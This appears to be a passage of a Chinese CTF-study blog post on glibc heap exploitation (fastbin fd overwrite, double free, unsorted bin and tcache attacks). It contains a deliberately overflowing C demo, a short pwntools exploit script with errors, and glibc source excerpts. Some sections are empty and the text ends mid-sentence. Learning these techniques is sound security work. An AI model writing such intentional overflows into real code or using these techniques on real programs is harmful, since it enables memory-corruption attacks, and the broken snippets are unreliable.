href="#条件" class="headerlink" title="条件"></a>条件</h3><p>存在可被溢出的fastbin chunk 快 ，要求可以使chunk快的fd都能被控制</p><p>被分配的地址内容可控（存在size域） </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用过一定手段篡改某堆块的fd指向一块目标内存（当然其对应<span class="built_in">size</span>位置的值要合法），当我们<span class="built_in">malloc</span>到此堆块后再<span class="built_in">malloc</span>一次，自然就把目标内存分配到了，就可以对这块目标内存为所欲为了，达到任意地址写任意值的效果（可以是关键数据也可以是函数指针）</span><br></pre></td></tr></table></figure><h3 id="技巧点"><a href="#技巧点" class="headerlink" title="技巧点"></a>技巧点</h3><ul><li><p><strong>技巧①：</strong>我们malloc的时候，尽量malloc一个大小在0x70<del>0x80之间的堆块（因此malloc的参数要为0x60</del>0x70之间），因为这样我们的目标地址就会被放入0x70~0x80大小范围的fastbin链中，此时我们去构造堆块的时候，由于系统中0x7f这样的数值比较好找，所以能够构造0x7f这样的数值来跳过glibc的检测一</p></li><li><p><strong>技巧②：</strong>接着技巧①，如果此时我们没有数值为0x7f这样的地址来让我们构造，那么我们就需要使用借助unsortedbin attack了，利用unsortedbin attack向我们的目标地址处写入一个0x7f的数值（见文章：<a href="https://blog.csdn.net/qq_41453285/article/details/99329694）" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/99329694）</a></p></li></ul><h3 id="覆盖fd指针实现利用"><a href="#覆盖fd指针实现利用" class="headerlink" title="覆盖fd指针实现利用"></a>覆盖fd指针实现利用</h3><p>当一个fastbin堆块存在堆溢出的时候，这种方法就可以使用了。简要的过程就是通过溢出覆盖一个在单链表中的chunk块的fd指针，当再次分配后（至少分配两次），就会在被覆盖的fd处分配fastbin chunk块，从而实现向任意地址分配堆块。当一个fastbin堆块存在堆溢出的时候，这种方法就可以使用了。简要的过程就是通过溢出覆盖一个在单链表中的chunk块的fd指针，当再次分配后（至少分配两次），就会在被覆盖的fd处分配fastbin chunk块，从而实现向任意地址分配堆块。</p><h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> BuforTst[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">void</span> *buf0,*buf1,*buf2,*buf3;</span><br><span class="line"> BuforTst[<span class="number">1</span>]=<span class="number">0x29</span>;</span><br><span class="line"> buf0=<span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line"> buf1=<span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"normal chunk1,chunk2被分配\n"</span>);</span><br><span class="line"> <span class="built_in">free</span>(buf1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"free chunk2\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"break\n"</span>);<span class="comment">//for debug</span></span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>,buf0,<span class="number">64</span>);<span class="comment">//overflow</span></span><br><span class="line">    buf2=<span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">    buf3=<span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"发生溢出的chunk2被分配\n %p\n溢出改写的fd地址被分配\n"</span>,buf2,buf3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>demo2: 通过覆盖fd指针实现向bss段分配堆块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = zio(<span class="string">'./tst'</span>,timeout=<span class="number">999</span>)</span><br><span class="line">io.read_until(<span class="string">'break'</span>)</span><br><span class="line"></span><br><span class="line">sc=<span class="string">'a'</span>*<span class="number">32</span>+<span class="number">132</span>(<span class="number">0x0</span>)+<span class="number">132</span>(<span class="number">0x29</span>)+<span class="number">132</span>(<span class="number">0x804A060</span>)</span><br><span class="line">io.writeline(sc)</span><br><span class="line"><span class="comment">#io.sendline(sc)</span></span><br><span class="line">io.read()</span><br></pre></td></tr></table></figure><h3 id="house-of-spirit-free-实现任意地址利用"><a href="#house-of-spirit-free-实现任意地址利用" class="headerlink" title="house_of_spirit(free 实现任意地址利用)"></a>house_of_spirit(free 实现任意地址利用)</h3><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放到对应的fastbin链表中，从而达到分配指定地址的 chunk 的目的。</p><h3 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to  Stack"></a>Alloc to  Stack</h3><h3 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h3><h3 id="double-free-1"><a href="#double-free-1" class="headerlink" title="double free"></a>double free</h3><p>example(glibc2.26之前)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">首先申请大小相同的 a b c 两块，申请c 是为了避免重合到top于fastbin是单链表且LIFO，后释放的b被插入到链表头chunk 然后依次释放 a b a (因为搜索的顺序跟添加顺序相反)。此时fast bin里 b-&gt;a-&gt;null，然后再次释放a就会导致a-&gt;b-&gt;a</span><br><span class="line">由于fastbin是单链表且LIFO，后释放的b被插入到链表头，所以在再次<span class="built_in">free</span>(a)，由于此时bin头节点指向b</span><br><span class="line">这里注意的就是 在再次释放a的时候，因为b的fd指向null所以不进入搜索，b第一个进入搜索，所以只再次释放第一个结果，其余的都不再释放。</span><br></pre></td></tr></table></figure><p><img src="/images/Heap/fastbin_free_chunk3.png" alt="img"></p><p>glibc2.26后引入了tchache机制</p><h2 id="tcache-struct-attact"><a href="#tcache-struct-attact" class="headerlink" title="tcache_struct attact"></a>tcache_struct attact</h2><p>libc 2.7后新加的一个分配堆块的机制，但没有检查地址是否合法</p><h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>BK = target -0x10(64 bit)</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><a href="https://www.anquanke.com/post/id/85127" target="_blank" rel="noopener">参考</a></p><p>堆在分配的时候，如果在申请的内存大小所对应的small bin或者large bin里面没有找到对应的chunk，此时会从unsorted bin里面去寻找chunk看是否存在合适的内存分配给用户，这个过程中会把unsorted bin链表给清空，清空的过程中没有进行检查，由此可能会发生任意地址可写。源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;  <span class="comment">//=</span></span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>当申请的堆块大于当前的top chunk size且小于用mmap分配的阈值时，系统会将原来的top chunk 放到unsorted bin中，同时分配新的较大的top chunk出来。</p><p>如果大于mmap分配的阈值，则直接从系统分配，源码如下：</p><p><img src="/images/Heap/t01946a32393555fbf5.png" alt="img"></p><p>所以为得到unsorted chunk，申请分配大内存需要大于top chunk的size且小于mmap的阈值</p><p>释放后将旧的top chunk放入到unsorted bin中的的代码如下：</p><p><a href="https://p4.ssl.qhimg.com/t01f58d0e161e8e0fad.png" target="_blank" rel="noopener"><img src="/images/Heap/t01f58d0e161e8e0fad.png" alt="http://p9.qhimg.com/t0102cb59a16c33a529.png"></a></p><p>不过在此之前，为了能让程序执行到这里，还需要通过一个检查：</p><p><a href="https://p0.ssl.qhimg.com/t012507b817ca7f4588.png" target="_blank" rel="noopener"><img src="/images/Heap/t012507b817ca7f4588.png" alt="http://p6.qhimg.com/t017dd19b992310956a.png"></a></p><p>检查总结起来为：</p><p>​    1,  size需要大于0x20(MINSIZE)</p><p>​    2,  pre_inuse位要为1</p><p>​    3，top chunk  address + top chunk size必须是页对齐的（页大小一般为0x1000）</p><p>所以分配内存时需要覆盖原来的top chunk size ，然后再申请一个比较大的堆块，这样就可以获得一个unsorted chunk</p><h4 id="构造更多的unsorted-chunk"><a href="#构造更多的unsorted-chunk" class="headerlink" title="构造更多的unsorted chunk"></a>构造更多的unsorted chunk</h4><p>如果只有一个unsorted chunk，是无法实现 attack的，所以需要构造更多的unsorted chunk，这一点可以通过覆盖刚刚加入到unsorted bin里面的chunk的后一个chunk的prev inuse位，这样在从这个unsorted chunk中申请出一个小的chunk后再释放掉的时候，就不会发生合并，即可实现构造更多的unsorted chunk。</p><h4 id="计算main-arena各个字段的距离"><a href="#计算main-arena各个字段的距离" class="headerlink" title="计算main_arena各个字段的距离"></a>计算main_arena各个字段的距离</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp=<span class="built_in">stderr</span>;</span><br><span class="line">    <span class="keyword">int</span> chain=&amp;(fp-&gt;_chain);</span><br><span class="line">    <span class="keyword">int</span> flags=&amp;(fp-&gt;_flags);</span><br><span class="line">    <span class="keyword">int</span> dis=chain-flags;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"FILE struct size: 0x%xn"</span>,<span class="keyword">sizeof</span>(FILE));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;chain - fp: 0x%x %xn"</span>,dis);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> mode=&amp;(fp-&gt;_mode);</span><br><span class="line">    dis=mode-flags;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;mode - fp: 0x%xn"</span>,dis);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> write_ptr=&amp;(fp-&gt;_IO_write_ptr);</span><br><span class="line">    dis=write_ptr-flags;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;write_ptr - fp: 0x%xn"</span>,dis);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> write_base=&amp;(fp-&gt;_IO_write_base);</span><br><span class="line">    dis=write_base-flags;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;write_base - fp: 0x%xn"</span>,dis);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> vtable_offset=&amp;(fp-&gt;_vtable_offset);</span><br><span class="line">    dis=vtable_offset-flags;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;vtable_offset - fp: 0x%xn"</span>,dis);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> read_ptr=&amp;(fp-&gt;_IO_read_ptr);</span><br><span class="line">    dis=read_ptr-flags;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;read_ptr - fp: 0x%xn"</span>,dis);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="examples"><a href="#examples" class="headerlink" title="examples"></a>examples</h3><h3 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO FILE"></a>IO FILE</h3><p>本段将跟随一篇系列教程进行学习 ，<a href="https://ray-cp.github.io/archivers/IO_FILE_fopen_analysis" target="_blank" rel="noopener">原文</a></p><h2 id="doublefree"><a href="#doublefree" class="headerlink" title="doublefree"></a>doublefree</h2><p>由堆块头部形成的隐式链s表可知，一个需释放堆块相邻的堆块有两个：<em>前一个块<em>（由当前块头指针加pre_size确定），</em>后一个块<em>（由当前块头指针加size确定）。从而，在合并堆块时会存在两种情况：</em>向后合并<em>、</em>向前合并*。当前一个块和当前块合并时，叫做向后合并。当后一个块和当前块合并时，叫做向前合并。<br>*相关代码</em><br>malloc.c int_free函数中相关代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char \*) (p)) + (s)))</span></span><br><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)      \</span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> \*) (p)) + (s)))-&gt;<span class="built_in">size</span> &amp; PREV_INUSE)</span><br><span class="line"></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="comment">/* consolidate backward \*/</span>                    <span class="comment">// "向后合并"</span></span><br><span class="line">     <span class="keyword">if</span> (!prev_inuse(p)) &#123;                           <span class="comment">//如果前一个块为空闲，则进行合并</span></span><br><span class="line">       prevsize = p-&gt;prev_size;                      <span class="comment">//获得前一个块大小</span></span><br><span class="line">       <span class="built_in">size</span> += prevsize;                             <span class="comment">//合并后堆块大小</span></span><br><span class="line">       p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));   <span class="comment">//根据当前块指针和前一个块大小，确定前一个块位置，即合并后块位置</span></span><br><span class="line">       unlink(av, p, bck, fwd);                      <span class="comment">//利用unlink从显式链表Unsorted bin取下前一个块</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      nextchunk = chunk_at_offset(p, <span class="built_in">size</span>);                 <span class="comment">//根据当前块指针和当前块大小， 确定后一个块位置，</span></span><br><span class="line">      nextsize = chunksize(nextchunk);                      <span class="comment">//获得后一个块大小</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize); <span class="comment">//根据下一个块的下一个块的PREV_INUSE位，判断下一个块是否空闲</span></span><br><span class="line">      <span class="comment">/* consolidate forward \*/</span>                <span class="comment">// "向前合并"</span></span><br><span class="line">     <span class="keyword">if</span> (!nextinuse) &#123;                          <span class="comment">//如果后一个块为空闲，则进行合并</span></span><br><span class="line">       unlink(av, nextchunk, bck, fwd);         <span class="comment">//使用unlink将后一个块从unsorted bin中取下</span></span><br><span class="line">       <span class="built_in">size</span> += nextsize;                        <span class="comment">//扩大当前块大小即可完成向前合并</span></span><br><span class="line">     &#125; <span class="keyword">else</span></span><br><span class="line">     clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><h2 id="Tcache-Attack"><a href="#Tcache-Attack" class="headerlink" title="Tcache Attack"></a>Tcache Attack</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-makes-heap-exploitation-easy-again" target="_blank" rel="noopener">参考ctf-wiki</a></p><p><a href="https://xz.aliyun.com/t/7350" target="_blank" rel="noopener">四个bin在tcache中的规定</a></p><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>glibc在编译时使用use_tcache条件来开启tcache机制，定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS        64      <span class="comment">//每个线程默认使用64个单链表结构的bins</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When "x" is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When "x" is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span>     <span class="comment">//64位机器以16B递增，从24B到1032B，32位机器以8B递增，从12B到512B，因此tcache bin只用于存放non-large的chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7        <span class="comment">//每个bins最多存放7个chunk</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><strong>tcache中新增的两个结构体</strong></p><p> tcache_entry 和 tcache_perthread_struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span> <span class="comment">//每个被放入相应bins中的chunk都会在其用户数据中包含一个tcache_entry（FD指针）.指向bins中的下一个chunk，构成单链表</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p><strong>其中两个重要的函数，tcache_get() 和tcache_put()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* tchache_get 中，仅仅检查了tc_idx,此外，我们可以将tcache当作一个类似于fastbin的单链表，只是它的check，没有fastbin那么复杂，仅仅检查tcache-&gt;entries[tc_idx]=e-&gt;next</span></span><br></pre></td></tr></table></figure><p>这两个函数会在函数 <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173" target="_blank" rel="noopener">_int_free</a> 和 <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051" target="_blank" rel="noopener">__libc_malloc</a> 的开头被调用，其中 <code>tcache_put</code> 当所请求的分配大小不大于<code>0x408</code>并且当给定大小的 tcache bin 未满时调用。一个 tcache bin 中的最大块数<code>mp_.tcache_count</code>是<code>7</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.</span></span><br><span class="line"><span class="comment">Each   tcache bin will hold at most this number of chunks. */</span> </span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="触发在tcache中放入chunk的操作"><a href="#触发在tcache中放入chunk的操作" class="headerlink" title="触发在tcache中放入chunk的操作"></a>触发在tcache中放入chunk的操作</h3><p>free时，在fastbin操作之前进行，如果chunk size符合要求，并且对应的bins还没有装满，则将其放入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (<span class="built_in">size</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">  &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>malloc时，如果fastbin中成功返回了要给需要的chunk，那么对应fastbin中的其他chunk会被放进相应的tcache bin 中，直到上线。需要注意的是，chunks在tcache bin 的顺序和在fastbin中的顺序是反过来的</p><ul><li><ul><li><pre><code class="c"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span>    <span class="comment">/* While we're here, if we see other chunks of the same size,</span><span class="comment">   stash them in the tcache.  */</span>    <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);    <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)  {    mchunkptr tc_victim;    <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span>    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count       &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)      {        <span class="keyword">if</span> (SINGLE_THREAD_P)      *fb = tc_victim-&gt;fd;        <span class="keyword">else</span>      {        REMOVE_FB (fb, pp, tc_victim);        <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))          <span class="keyword">break</span>;      }        tcache_put (tc_victim, tc_idx);      }  }<span class="meta">#<span class="meta-keyword">endif</span></span>&lt;!--￼<span class="number">36</span>--&gt;</code></pre></li></ul></li></ul><p>通过将一个内存块释放两次，那么申请一个出来，就可以修改其fd指针了，控制之后申请返回的地址为任意地址，fastbin的话还需要满足地址+8（也就是size字段）处的值是在对应fastbin范围内，比如栗子中fastbin的大小是0x20，那么指定的其他地址处，size字段值应该是0x20~0x2f。但是对于tcache来说就简单多了，没有double free检测，没有size字段的检测。</p><p>栈中伪造了一个0x20大小堆，然后通过free(a), free(b), free(a)构成一个doublefree（原理同fastbin_dup), 此时fastbin的链接状态为a-&gt;b-&gt;a。然后再次申请两个0x8大小的堆，由于fastbin的lifo，此时fastbin中只剩下a，且此时堆a存在于fastbin和用户申请的堆中，即我们可以控制一个存在与fastbin的堆的内容。容易想到的一种利用方式是伪造fastbin链表的内容，进而达到伪造地址处申请堆的效果。 </p><p>在a地址其后开辟的空间中 存放了&amp;stack_var的地址，此时堆a的fd指向 &amp;stack_var, 即fastbin:a-&gt;stack_var, 